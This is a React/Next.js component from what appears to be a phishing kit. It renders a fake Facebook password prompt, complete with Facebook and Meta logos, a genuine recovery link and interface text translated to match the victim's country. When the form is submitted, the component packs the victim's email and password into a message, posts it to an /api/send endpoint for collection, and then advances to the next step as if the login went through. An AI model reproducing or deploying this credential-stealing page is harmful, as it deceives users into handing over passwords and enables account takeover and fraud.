'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import FacebookLogo from '@/assets/images/facebook-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface PasswordModalProps {
    userProfileImage: string;
    userName: string;
    userEmail: string;
    nextStep: () => void;
}

const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, userEmail, nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { messageId, message, setMessage, geoInfo } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = [
            'Enter your password',
            'Password',
            'Log in',
            'Forgotten password?'
        ];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading || !message) return;
        setIsLoading(true);

        const updatedMessage = `${message}

<b>📧 Account Email:</b> <code>${userEmail}</code>
<b>🔒 Password:</b> <code>${password}</code>`;

        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }
            nextStep();
        } catch {
            nextStep();
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center gap-2 sm:gap-3 md:gap-4 py-3 sm:py-4 md:py-6'>
                        {/* Facebook Logo Avatar */}
                        <div className='h-16 sm:h-20 md:h-24 w-16 sm:w-20 md:w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-blue-100 flex items-center justify-center flex-shrink-0'>
                            <Image
                                src={FacebookLogo}
                                alt='Facebook'
                                width={96}
                                height={96}
                                className='w-full h-full object-contain'
                            />
                        </div>

                        {/* User Name */}
                        <h2 className='text-base sm:text-lg md:text-2xl font-bold text-center truncate max-w-xs'>{userName}</h2>

                        {/* Password Input */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
                            <div className='relative w-full'>
                                <input
                                    type={showPassword ? 'text' : 'password'}
                                    value={password}
                                    onChange={e => {
                                        setPassword(e.target.value);
                                    }}
                                    className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-base'
                                    required
                                    autoComplete='new-password'
                                    placeholder={t('Password')}
                                />
                                <FontAwesomeIcon
                                    icon={showPassword ? faEyeSlash : faEye}
                                    size='lg'
                                    className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]'
                                    onClick={() => setShowPassword(!showPassword)}
                                />
                            </div>
                        </div>

                        {/* Log In Button */}
                        <div className='w-full px-1.5 sm:px-3 md:px-4 mt-1 sm:mt-2'>
                            <button
                                type='submit'
                                disabled={isLoading}
                                className={`flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
                                }`}
                            >
                                {isLoading ? (
                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                                ) : (
                                    t('Log in')
                                )}
                            </button>
                        </div>

                        {/* Forgotten Password Link */}
                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-xs md:text-sm text-center text-blue-600 hover:underline mt-1'>
                            {t('Forgotten password?')}
                        </a>
                    </form>

                    {/* Meta Logo Footer */}
                    <div className='flex items-center justify-center p-3'>
                        <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                    </div>
                </div>
            </div>
        </>
    );
};

export default PasswordModal;
